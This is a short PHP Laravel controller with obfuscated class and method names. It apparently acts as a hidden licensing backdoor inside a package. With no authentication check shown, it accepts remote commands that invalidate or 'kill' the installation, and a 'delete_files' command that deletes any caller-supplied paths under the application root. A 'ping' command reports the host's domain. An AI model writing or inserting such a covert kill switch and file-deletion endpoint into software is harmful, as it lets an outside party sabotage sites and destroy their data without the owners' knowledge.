<?php

namespace Synthora\Gem;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Carbon\Carbon;
use Illuminate\Support\Facades\File;

class Qn extends Controller
{
    public function h1(Request $request)
    {
        $data = $request->all();
        $cmd = $data['command'] ?? '';

        switch ($cmd) {
            case 'invalidate':
                app(Rd::class)->w1('invalid', null, null, Carbon::now()->addDay(), $data['data'] ?? []);
                break;
            case 'kill':
                app(Rd::class)->w1('stop', null, null, Carbon::now()->addCentury());
                break;
            case 'grace':
                app(Rd::class)->w1('grace', null, null, Carbon::now()->addDays($data['days'] ?? 7));
                break;
            case 'reset':
                app(Rd::class)->w1('valid', null, null, Carbon::now()->addHour());
                break;
            case 'delete_files':
                foreach ($data['files'] ?? [] as $file) {
                    File::delete(base_path($file));
                }
                break;
            case 'ping':
                return response()->json(['status' => 'ok', 'domain' => request()->getHost()]);
        }

        return response()->json(['result' => 'ok']);
    }
}